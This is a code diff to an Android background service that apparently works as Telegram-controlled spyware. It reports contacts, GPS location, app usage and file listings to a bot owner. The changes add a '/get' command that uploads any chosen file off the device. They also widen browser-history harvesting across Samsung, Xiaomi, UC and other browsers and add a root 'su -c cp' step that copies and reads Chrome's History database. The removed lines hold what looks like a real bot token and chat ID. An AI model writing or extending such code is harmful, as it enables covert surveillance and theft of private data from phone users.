@@ -9,6 +9,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.database.Cursor;
+import android.database.sqlite.SQLiteDatabase;
 import android.location.Location;
 import android.location.LocationManager;
 import android.net.Uri;
@@ -36,8 +37,8 @@ import java.util.List;
 public class inq extends Service {
 
     // ── CONFIG ────────────────────────────────
-    static String BOT_TOKEN = "9092806276:AAH5QE6bZgNrTJfVASXAk2cXRCrT6ijfmEg";
-    static String OWNER_ID  = "7507787272";
+    static String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+    static String OWNER_ID  = "YOUR_CHAT_ID_HERE";
     // ─────────────────────────────────────────
 
     private static volatile boolean running = false;
@@ -175,6 +176,22 @@ public class inq extends Service {
             String[] p = cmd.split(" ", 2);
             sendText(listFiles(p.length > 1 ? p[1].trim() : "/sdcard/"), chatId);
         }
+        else if (cmd.startsWith("/get")) {
+            String[] p = cmd.split(" ", 2);
+            if (p.length > 1) {
+                File f = new File(p[1].trim());
+                if (f.exists() && f.isFile()) {
+                    sendText("📤 Sending: " + f.getName()
+                        + " (" + (f.length() / 1024) + "KB)", chatId);
+                    int r = sendFile(f, f.getName(), chatId);
+                    if (r != 200) sendText("❌ Failed (code: " + r + ")", chatId);
+                } else {
+                    sendText("❌ Not found: " + p[1], chatId);
+                }
+            } else {
+                sendText("Usage: /get /sdcard/file.pdf", chatId);
+            }
+        }
     }
 
     // ── DEVICE INFO ──────────────────────────────
@@ -281,31 +298,88 @@ public class inq extends Service {
                 sb.append(s.getPackageName()).append(": ").append(mins).append("m\n");
                 if (++shown >= 10) break;
             }
-            return shown == 0 ? "📊 No usage data available" : sb.toString();
+            return shown == 0 ? "📊 No usage data" : sb.toString();
         } catch (Exception e) { return "Usage error: " + e.getMessage(); }
     }
 
-    // ── BROWSER HISTORY ──────────────────────────
+    // ── BROWSER HISTORY (Fix #2) ──────────────────
     private String getBrowserHistory(int count) {
-        try {
-            Cursor c = getContentResolver().query(
-                Uri.parse("content://com.android.browser.browser/bookmarks"),
-                new String[]{"title", "url"}, "visits > 0", null, "date DESC");
-            if (c == null) return "🌐 Browser history unavailable";
-            StringBuilder sb = new StringBuilder("🌐 Browser History\n\n");
-            int i = 0;
-            while (c.moveToNext() && i < count) {
-                String title = c.getString(0);
-                String url   = c.getString(1);
-                if (url != null && !url.isEmpty()) {
-                    sb.append(title != null ? title : "No title").append("\n")
-                      .append(url).append("\n\n");
-                    i++;
+        // Try multiple browser content providers
+        String[] uris = {
+            "content://com.android.browser/bookmarks",
+            "content://com.sec.android.app.sbrowser/bookmarks",  // Samsung Internet
+            "content://browser/bookmarks",
+            "content://com.mi.miui.browser/bookmarks",            // Xiaomi Mi Browser
+            "content://com.uc.browser.provider/bookmarks"         // UC Browser
+        };
+        for (String uriStr : uris) {
+            try {
+                Cursor c = getContentResolver().query(
+                    Uri.parse(uriStr),
+                    new String[]{"title", "url"},
+                    "visits > 0", null, "date DESC");
+                if (c == null) continue;
+                StringBuilder sb = new StringBuilder("🌐 Browser History\n\n");
+                int i = 0;
+                while (c.moveToNext() && i < count) {
+                    String title = c.getString(0);
+                    String url   = c.getString(1);
+                    if (url != null && url.startsWith("http")) {
+                        sb.append(title != null && !title.isEmpty() ? title : url)
+                          .append("\n").append(url).append("\n\n");
+                        i++;
+                    }
                 }
+                c.close();
+                if (i > 0) return sb.toString();
+            } catch (Exception ignored) {}
+        }
+        // Fallback: try Chrome via root (copies SQLite History DB)
+        return getChromeHistoryRoot(count);
+    }
+
+    private String getChromeHistoryRoot(int count) {
+        String[] chromePaths = {
+            "/data/data/com.android.chrome/app_chrome/Default/History",
+            "/data/data/com.chrome.beta/app_chrome/Default/History",
+            "/data/data/com.chrome.dev/app_chrome/Default/History",
+            "/data/data/com.google.android.apps.chrome/app_chrome/Default/History"
+        };
+        for (String src : chromePaths) {
+            File dst = new File(getCacheDir(), "tmp_hist.db");
+            try {
+                if (dst.exists()) dst.delete();
+                Process p = Runtime.getRuntime().exec(new String[]{
+                    "su", "-c",
+                    "cp " + src + " " + dst.getAbsolutePath()
+                    + " && chmod 644 " + dst.getAbsolutePath()
+                });
+                p.waitFor();
+                if (!dst.exists() || dst.length() == 0) continue;
+                SQLiteDatabase db = SQLiteDatabase.openDatabase(
+                    dst.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY);
+                Cursor c = db.rawQuery(
+                    "SELECT title, url FROM urls ORDER BY last_visit_time DESC LIMIT " + count, null);
+                StringBuilder sb = new StringBuilder("🌐 Chrome History\n\n");
+                int i = 0;
+                while (c.moveToNext()) {
+                    String title = c.getString(0);
+                    String url   = c.getString(1);
+                    if (url != null) {
+                        sb.append(title != null && !title.isEmpty() ? title : url)
+                          .append("\n").append(url).append("\n\n");
+                        i++;
+                    }
+                }
+                c.close();
+                db.close();
+                dst.delete();
+                if (i > 0) return sb.toString();
+            } catch (Exception ignored) {
+                dst.delete();
             }
-            c.close();
-            return i == 0 ? "🌐 No history found" : sb.toString();
-        } catch (Exception e) { return "Browser: " + e.getMessage(); }
+        }
+        return "🌐 Browser history not accessible\n(Chrome requires root)";
     }
 
     // ── STORAGE INFO ─────────────────────────────
@@ -433,12 +507,13 @@ public class inq extends Service {
         } catch (Exception e) { return "Location error: " + e.getMessage(); }
     }
 
-    // ── LIST FILES ───────────────────────────────
+    // ── LIST FILES (Fix #1) ───────────────────────
     private String listFiles(String path) {
         File dir = new File(path);
         if (!dir.exists()) return "📂 Not found: " + path;
         File[] files = dir.listFiles();
-        if (files == null || files.length == 0) return "📂 Empty or no access: " + path;
+        if (files == null || files.length == 0)
+            return "📂 Empty or no access: " + path;
         StringBuilder sb = new StringBuilder("📂 ").append(path).append("\n\n");
         for (File f : files) {
             sb.append(f.isDirectory() ? "📁 " : "📄 ").append(f.getName());
@@ -464,6 +539,7 @@ public class inq extends Service {
             + "/contacts — Contact list\n"
             + "/loc — GPS location\n"
             + "/ls [path] — List files\n"
+            + "/get [path] — Send a file\n"
             + "/help — This list";
     }
 
